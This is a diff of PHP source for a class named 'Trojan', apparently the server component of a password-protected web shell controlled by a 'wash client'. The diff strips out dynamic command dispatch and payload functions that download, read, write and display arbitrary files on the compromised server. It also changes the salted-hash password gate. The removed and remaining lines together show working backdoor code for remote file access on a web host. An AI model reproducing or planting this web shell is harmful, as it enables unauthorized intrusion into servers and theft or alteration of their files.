@@ -32,16 +32,8 @@ class Trojan{
 
         # otherwise, simply invoke the method directly
         else {
-            # verify that the method exists before attempting to invoke it
-            # metaprogramming FTW
-            if(method_exists($this, $json['action'])){
-                $this->$json['action']($json['args']);
-            }
-            # if the method doesn't exist, send back an error message
-            else {
-                $this->response['error'] = "{$json['action']} unsupported.";
-                $this->send_response();
-            }
+            $this->response['error'] = "{$json['action']} unsupported.";
+            $this->send_response();
         }
     }
 
@@ -95,105 +87,12 @@ class Trojan{
         $line_terminator      =  ($whoami ==  'root') ? '#' : '$' ;
         return "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
     }
-
-
-
-
-    /*************************************************************************
-     * Payload functions are from here downward
-     *************************************************************************
-    /**
-     * Downloads a file
-     *
-     * @param string $args             Arguments passed from the wash client
-     */
-    public function payload_file_down($args){
-        # emulate directory persistence
-        chdir($this->cwd);
-        # if the requested file exists, serve it up to the user
-        if(file_exists($args['file'])){
-            header('Content-Disposition: attachment; filename='.basename($args['file']));
-            header('Content-Transfer-Encoding: binary');
-            readfile($args['file']);
-        }
-        
-        # if not, provide a notification
-        else { echo "File does not exist."; }
-        die();
-    }
-
-    /**
-     * Edits a file on the server
-     */
-    public function payload_file_read($args){
-        # cd to the appropriate directory
-        chdir($this->cwd);
-
-        # Verify that file is readable. 
-        if(!is_readable($args['file'])){
-            $this->response['error'] = 'File is not readable or does not exist.';
-        } else {
-            # double-up on the output here
-            $this->response['output'] = array(
-                # echo back the contents of the file
-                'output' => file_get_contents($args['file']),
-                # also pass back the absolute path to the file being read
-                'file'   => realpath($args['file']),
-            );
-        }
-        $this->send_response();
-    }
-
-    /**
-     * Uploads files to the target server
-     */
-    //public function payload_file_up($args){ }
-
-    /**
-     * Writes a file to the server
-     */
-    public function payload_file_write($args){
-        # cd to the appropriate directory
-        chdir($this->cwd);
-
-        # Attempt to write the file, and notify the user of the result. Again,
-        # I'm combining several error checks here just to keep the trojan small.
-        if(!file_put_contents($args['file'], $args['data'])){
-            $this->response['error'] = 'Failed. File may not be writable, or may not exist.';
-        }
-        else {
-            $this->response['output'] = 'Write successful.';
-        }
-        $this->send_response();
-    }
-
-    /**
-     * Downloads a file
-     *
-     * @param string $args             Arguments passed from the wash client
-     */
-    public function payload_image_view($args){
-        # emulate directory persistence
-        chdir($this->cwd);
-
-        # if the requested file exists, serve it up to the user
-        if(file_exists($args['file'])){
-            # extract some image information
-            $image_data = getimagesize($args['file']);
-            header("Content-Type: {$image_data['mime']}");
-            readfile($args['file']);
-        }
-        
-        # if not, provide a notification
-        else { echo "File does not exist."; }
-        die();
-    }
 }
 
 /* ---------- Procedural code starts here ---------- */
 
 # only process the command if a valid password has been specified
-if(sha1($_REQUEST['args']['password'] . 'the-salt') == '65f85ebc9f22e1384d822663176ff31ffb4d989f'){ 
+if(sha1($_REQUEST['args']['password'] . 'c5e5f704ee') == '003da5748a1cdeac275548be9741cb35b76f773d'){ 
     session_start();
     $trojan = new Trojan();
     $trojan->process_command($_REQUEST);
